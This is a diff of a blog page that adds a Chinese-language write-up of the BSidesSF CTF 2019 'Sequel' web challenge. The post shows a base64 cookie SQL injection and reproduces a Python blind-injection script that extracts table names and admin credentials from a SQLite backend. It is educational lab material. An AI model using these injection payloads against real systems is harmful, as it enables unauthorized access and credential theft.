@@ -15,7 +15,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Automne&#39;s Shadow</title>
+    <title>BSidesSF CTF 2019 Sequel WriteUp · Automne&#39;s Shadow</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -194,6 +196,8 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
@@ -201,27 +205,85 @@
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
     
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Automne&#39;s Shadow.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">BSidesSF CTF 2019 Sequel WriteUp</a>
+            </div>
+    </div>
+    
     <a class="home-link" href="/">Automne's Shadow.</a>
 </header>
     <div class="wrapper">
-        <div class="site-intro" style>
+        <div class="site-intro" style="height:50vh;">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            BSidesSF CTF 2019 Sequel WriteUp
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="sqli">sqli</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="sqlite">sqlite</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/07</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -322,103 +384,88 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/07/BSidesSF-CTF-2019-Sequel-WriteUp/">
-            
-                <span>BSidesSF CTF 2019 Sequel WriteUp</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Web</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="sqli">sqli</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="sqlite">sqlite</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p><strong>Web</strong><br><a id="more"></a></p>
+<p>这题，比赛时没有做出来，赛后看岛国小哥的WriteUp复现了一下。</p>
+<p>进入主页，一个登陆界面</p>
+<p><img src="1.png" alt="automne"></p>
+<p>使用burpsuite代理抓包，在登陆框输入admin/admin。</p>
+<p><img src="2.png" alt="automne"></p>
+<p>直接放行后会返回 “Unknown user.”<br>从POST的body字段里看到了guest_password=guest的字段<br>于是尝试使用guest/guest登陆</p>
+<p>将请求发送到Repeater里，可以看到302跳转里设置了Cookie</p>
+<p><img src="3.png" alt="automne"></p>
+<pre><code>1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9; HttpOnly
+</code></pre><p>将这段代码使用base64解密</p>
+<pre><code>$ python
+Python 2.7.15 (v2.7.15:ca079a3ea3, Apr 30 2018, 16:30:26) [MSC v.1500 64 bit (AMD64)] on win32
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.b64decode(&quot;eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9&quot;)
+&apos;{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}&apos;
+&gt;&gt;&gt;
+</code></pre><p>guest/guest登陆后的内容：</p>
+<p><img src="4.png" alt="automne"></p>
+<p>接着尝试修改{“username”:”guest”,”password”:”guest”}里的内容，看能不能注入。<br>此处需要注意转义双引号。</p>
+<pre><code>{&quot;username&quot;:&quot;guest\&quot; or \&quot;A\&quot;=\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;}
+</code></pre><p>然后对上面的json串base64编码，需要注意添加r符号告诉编译器不要转义反斜杠\</p>
+<pre><code>&gt;&gt;&gt; base64.b64encode(r&apos;{&quot;username&quot;:&quot;guest\&quot; or \&quot;A\&quot;=\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;}&apos;)
+&apos;eyJ1c2VybmFtZSI6Imd1ZXN0XCIgb3IgXCJBXCI9XCJBIiwicGFzc3dvcmQiOiJndWVzdCJ9&apos;
+</code></pre><p>然后刷新guest身份登陆的界面，抓包修改Cookie，</p>
+<p><img src="5.png" alt="automne"></p>
+<p>就可以得到下图的界面，发现注入成功。</p>
+<p><img src="6.png" alt="automne"></p>
+<p>这道题的数据库是sqlite，代码里userinfo表里的username和password字段目测是猜的—_—<br>搜索了一下，发现sqlite里查看某个表的所有字段一般使用PRAGMA命令，但是这里我获取不到。</p>
+<pre><code>PRAGMA table_info(xxx)
+</code></pre><p><img src="7.png" alt="automne"></p>
+<p>贴上岛国小哥的利用代码，盲注获取数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'https://sequel-9cba4c8e.challenges.bsidessf.net/sequels'</span></span><br><span class="line">LETTERS = string.printable</span><br><span class="line">target = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    f = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> LETTERS:</span><br><span class="line">        tmp = target + e</span><br><span class="line">        <span class="comment"># 1.获取表名</span></span><br><span class="line">        payload = <span class="string">r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'</span>.format(len(tmp),e)</span><br><span class="line">        <span class="comment"># 2.获取username字段内容</span></span><br><span class="line">        <span class="comment">#payload = r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'.format(len(tmp),e)</span></span><br><span class="line">        <span class="comment"># 3.获取password字段内容</span></span><br><span class="line">        <span class="comment">#payload = r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'.format(len(tmp),e)</span></span><br><span class="line">        payload = base64.b64encode(payload)</span><br><span class="line">        req = requests.Request(</span><br><span class="line">            <span class="string">'GET'</span>,</span><br><span class="line">            URL,</span><br><span class="line">            params=&#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">"1337_AUTH"</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">            </span><br><span class="line">        prepared = req.prepare()</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.send(prepared, allow_redirects = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Movie"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target = tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f: <span class="keyword">continue</span></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
+<p>最终得到账号密码：</p>
+<pre><code>sequeladmin/f5ec3af19f0d3679e7d5a148f4ac323d
+</code></pre><p>直接登录，即可得到flag</p>
+<p><img src="8.png" alt="automne"></p>
+<hr>
+<p>参考链接：<a href="https://graneed.hatenablog.com/entry/2019/03/05/204738" target="_blank" rel="noopener">https://graneed.hatenablog.com/entry/2019/03/05/204738</a></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/05/BSidesSF-CTF-2017-FlagStore-WriteUp/">
-            
-                <span>Android CTF Practice の BSidesSF_CTF_2017_flagstore</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Android</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/05</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="broadcastreceiver">broadcastreceiver</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="reverse">reverse</a>
-    
-</div>
-            
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://ce-automne.github.io">Automne</a>
+            </p><p>原文链接: <a href="https://ce-automne.github.io/2019/03/07/BSidesSF-CTF-2019-Sequel-WriteUp/">https://ce-automne.github.io/2019/03/07/BSidesSF-CTF-2019-Sequel-WriteUp/</a>
+            </p><p>发表日期: <a href="https://ce-automne.github.io/2019/03/07/BSidesSF-CTF-2019-Sequel-WriteUp/">March 7th 2019, 10:44:13 pm</a>
+            </p><p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/03/BSidesSF-CTF-2017-Pinlock-WriteUp/">
-            
-                <span>Android CTF Practice の BSidesSF_CTF_2017_pinlock</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Android</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="reverse">reverse</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="sha-1">sha-1</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/03/05/BSidesSF-CTF-2017-FlagStore-WriteUp/" title="Android" ctf practice の bsidessf_ctf_2017_flagstore>
+                    <div class="prevTitle">Android CTF Practice の BSidesSF_CTF_2017_flagstore</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -484,6 +531,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -684,6 +749,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
